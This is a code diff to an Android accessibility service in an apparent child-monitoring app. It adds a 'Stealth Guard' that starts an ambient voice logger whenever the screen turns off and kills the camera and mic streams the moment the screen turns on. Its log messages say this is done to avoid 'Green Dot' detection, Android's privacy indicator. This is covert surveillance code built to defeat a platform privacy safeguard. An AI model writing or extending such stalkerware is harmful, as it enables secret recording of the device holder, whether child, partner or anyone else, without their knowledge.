@@ -254,12 +254,27 @@ class VyraAccessibilityService : AccessibilityService() {
                         // The child woke up the screen!
                         if (prefs.isStealthScreenGuardEnabled) {
                             Log.w(AppConstants.TAG, "Stealth Guard: Child turned screen ON! Instantly killing Camera/Mic to avoid Green Dot detection.")
-                            // Immediately cut off camera & mic stream within 50ms
+                            // Immediately cut off camera & ambient mic streams within 50ms
                             stopService(Intent(this@VyraAccessibilityService, RemoteCameraStreamService::class.java))
+                            
+                            val stopAmbient = Intent(this@VyraAccessibilityService, AmbientAudioLoggerService::class.java).apply {
+                                action = AmbientAudioLoggerService.ACTION_STOP_AMBIENT_RECORDING
+                            }
+                            startService(stopAmbient)
                         }
                     }
                     Intent.ACTION_SCREEN_OFF -> {
-                        Log.i(AppConstants.TAG, "Stealth Guard: Screen is OFF. Safe for stealth audio monitoring (No Green Dot visible on unpowered display).")
+                        Log.i(AppConstants.TAG, "Stealth Guard: Screen is OFF. Activating pocket ambient voice logger.")
+                        if (prefs.isStealthScreenGuardEnabled) {
+                            val startAmbient = Intent(this@VyraAccessibilityService, AmbientAudioLoggerService::class.java).apply {
+                                action = AmbientAudioLoggerService.ACTION_START_AMBIENT_RECORDING
+                            }
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                startForegroundService(startAmbient)
+                            } else {
+                                startService(startAmbient)
+                            }
+                        }
                     }
                 }
             }
